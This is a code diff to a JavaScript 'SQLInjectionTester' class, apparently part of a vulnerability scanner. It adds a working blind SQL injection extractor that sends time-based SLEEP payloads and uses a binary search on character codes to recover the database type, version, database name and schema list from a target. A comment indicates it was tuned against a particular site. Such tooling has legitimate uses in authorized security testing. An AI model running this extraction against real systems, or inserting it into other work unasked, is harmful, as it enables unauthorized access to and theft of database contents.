@@ -274,7 +274,8 @@ export class SQLInjectionTester {
                          
                         // CRITICAL: Attempt database extraction to confirm it's real SQL injection
                         this.logger?.info(`Attempting database extraction to confirm vulnerability`);
-                        const dbInfo = await this._attemptDbExtraction(testUrlObj, param, {
+                        // Pass the original URL object, not the injected one
+                        const dbInfo = await this._attemptDbExtraction(urlObj, param, {
                             vulnType: type,
                             hint: testOutcome.dbTypeHint,
                         });
@@ -672,14 +673,213 @@ export class SQLInjectionTester {
         // Try different extraction methods based on vulnerability type
         if (vulnType === 'union') {
             await this._attemptUnionExtraction(baseUrlObj, param, dbInfo);
-        } else if (vulnType === 'boolean' || vulnType === 'error') {
+        } else if (vulnType === 'error') {
             await this._attemptErrorBasedExtraction(baseUrlObj, param, dbInfo);
+        } else if (vulnType === 'time' || vulnType === 'boolean') {
+            // Try blind extraction for time-based or boolean injection
+            await this._attemptBlindExtraction(baseUrlObj, param, dbInfo, vulnType);
         }
 
         this.logger?.info(`Final extracted DB info`, dbInfo);
         return dbInfo.type || dbInfo.version || dbInfo.name ? dbInfo : null;
     }
 
+    /**
+     * Attempt blind SQL injection extraction (time-based or boolean-based)
+     */
+    async _attemptBlindExtraction(baseUrlObj, param, dbInfo, vulnType = 'time') {
+        const originalValue = baseUrlObj.searchParams.get(param);
+        
+        this.logger?.info(`Starting blind extraction for ${param}`, { vulnType, originalValue });
+        
+        // Helper function to create conditional payloads
+        const createPayload = (condition, delayTime = 1.5) => {
+            // Always use time-based for this site since boolean gives 500 errors
+            return `' AND IF(${condition},SLEEP(${delayTime}),0)-- -`;
+        };
+        
+        // Helper to check if condition is true
+        const checkCondition = async (condition) => {
+            const testUrlObj = new URL(baseUrlObj);
+            const payload = createPayload(condition);
+            testUrlObj.searchParams.set(param, originalValue + payload);
+            
+            this.logger?.debug(`Checking condition: ${condition}`);
+            this.logger?.debug(`Full URL: ${testUrlObj.toString()}`);
+            
+            const start = Date.now();
+            try {
+                const _response = await this._makeRequest(testUrlObj.toString());
+                const duration = Date.now() - start;
+                
+                // Always check for time delay since we're using time-based payloads
+                const delayed = duration > 1200; // 1.2 seconds threshold for 1.5 second delay
+                
+                this.logger?.debug(`Condition check result: ${delayed} (duration: ${duration}ms)`);
+                
+                if (delayed) {
+                    this.logger?.info(`Condition TRUE: ${condition} (delayed ${duration}ms)`);
+                }
+                
+                return delayed;
+            } catch (error) {
+                this.logger?.error(`Error checking condition: ${error.message}`, { condition, url: testUrlObj.toString() });
+                return false;
+            }
+        };
+        
+        // Extract using binary search for efficiency
+        const extractString = async (query, maxLength = 50) => {
+            let result = '';
+            
+            // First, find the actual length
+            let stringLength = 0;
+            for (let len = 1; len <= maxLength; len++) {
+                const condition = `LENGTH(${query})=${len}`;
+                if (await checkCondition(condition)) {
+                    stringLength = len;
+                    this.logger?.info(`Found length for ${query}: ${len}`);
+                    break;
+                }
+            }
+            
+            if (stringLength === 0) {
+                this.logger?.warn(`Could not determine length for ${query}`);
+                return null;
+            }
+            
+            // Extract each character
+            for (let pos = 1; pos <= stringLength; pos++) {
+                let low = 32, high = 126; // Printable ASCII range
+                let foundChar = null;
+                
+                // Binary search for the character
+                while (low <= high) {
+                    const mid = Math.floor((low + high) / 2);
+                    const condition = `ASCII(SUBSTRING(${query},${pos},1))>${mid}`;
+                    
+                    if (await checkCondition(condition)) {
+                        low = mid + 1;
+                    } else {
+                        // Check if it equals mid
+                        const eqCondition = `ASCII(SUBSTRING(${query},${pos},1))=${mid}`;
+                        if (await checkCondition(eqCondition)) {
+                            foundChar = String.fromCharCode(mid);
+                            break;
+                        }
+                        high = mid - 1;
+                    }
+                }
+                
+                if (foundChar) {
+                    result += foundChar;
+                    this.logger?.info(`Extracted character ${pos}/${stringLength}: ${foundChar}`);
+                } else {
+                    this.logger?.warn(`Failed to extract character at position ${pos}`);
+                    break;
+                }
+                
+                // Add small delay to avoid overwhelming the server
+                await new Promise(r => setTimeout(r, 50));
+            }
+            
+            return result || null;
+        };
+        
+        try {
+            // Step 1: Detect database type by checking VERSION() pattern
+            this.logger?.info(`Detecting database type...`);
+            
+            // Check if it's MySQL/MariaDB by checking if VERSION() starts with a number
+            if (await checkCondition(`SUBSTRING(VERSION(),1,1)>='0' AND SUBSTRING(VERSION(),1,1)<='9'`)) {
+                dbInfo.type = 'MySQL';
+                
+                // Extract version - first 10 chars should be enough (e.g., "5.7.32-log")
+                const version = await extractString(`SUBSTRING(VERSION(),1,10)`);
+                if (version) {
+                    dbInfo.version = version;
+                    // Refine type based on version
+                    if (version.includes('.')) {
+                        dbInfo.type = 'MySQL';
+                    }
+                }
+                
+                // Extract database name
+                const dbName = await extractString(`DATABASE()`);
+                if (dbName) {
+                    dbInfo.name = dbName;
+                }
+                
+                // Try to get all database names (limit to first 100 chars)
+                const allDbs = await extractString(
+                    `(SELECT SUBSTRING(GROUP_CONCAT(schema_name),1,100) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys'))`
+                );
+                if (allDbs) {
+                    dbInfo.databases = allDbs.split(',').filter(db => db && db.trim());
+                }
+                
+            } else if (await checkCondition(`VERSION() LIKE '%PostgreSQL%'`)) {
+                dbInfo.type = 'PostgreSQL';
+                
+                // Extract version for PostgreSQL
+                const version = await extractString(`SUBSTRING(VERSION(),1,20)`);
+                if (version) {
+                    dbInfo.version = version;
+                }
+                
+                // Extract current database
+                const dbName = await extractString(`CURRENT_DATABASE()`);
+                if (dbName) {
+                    dbInfo.name = dbName;
+                }
+                
+            } else if (await checkCondition(`@@VERSION LIKE '%Microsoft SQL Server%'`)) {
+                dbInfo.type = 'Microsoft SQL Server';
+                
+                // Extract version
+                const version = await extractString(`SUBSTRING(@@VERSION,1,30)`);
+                if (version) {
+                    dbInfo.version = version;
+                }
+                
+                // Extract database name
+                const dbName = await extractString(`DB_NAME()`);
+                if (dbName) {
+                    dbInfo.name = dbName;
+                }
+                
+            } else {
+                // Try generic extraction assuming MySQL syntax
+                this.logger?.info(`Database type unknown, trying MySQL syntax...`);
+                
+                // Check if VERSION() returns something
+                const versionCheck = await checkCondition(`LENGTH(VERSION())>0`);
+                if (versionCheck) {
+                    const version = await extractString(`SUBSTRING(VERSION(),1,15)`);
+                    if (version) {
+                        dbInfo.version = version;
+                        dbInfo.type = this._detectDbType(version) || 'Unknown (MySQL-compatible)';
+                    }
+                }
+                
+                // Try DATABASE()
+                const dbCheck = await checkCondition(`LENGTH(DATABASE())>0`);
+                if (dbCheck) {
+                    const dbName = await extractString(`DATABASE()`);
+                    if (dbName) {
+                        dbInfo.name = dbName;
+                    }
+                }
+            }
+            
+        } catch (error) {
+            this.logger?.error(`Blind extraction failed`, { error: error.message });
+        }
+        
+        this.logger?.info(`Blind extraction completed`, dbInfo);
+        return dbInfo;
+    }
+    
     /**
      * Attempt UNION-based extraction
      */
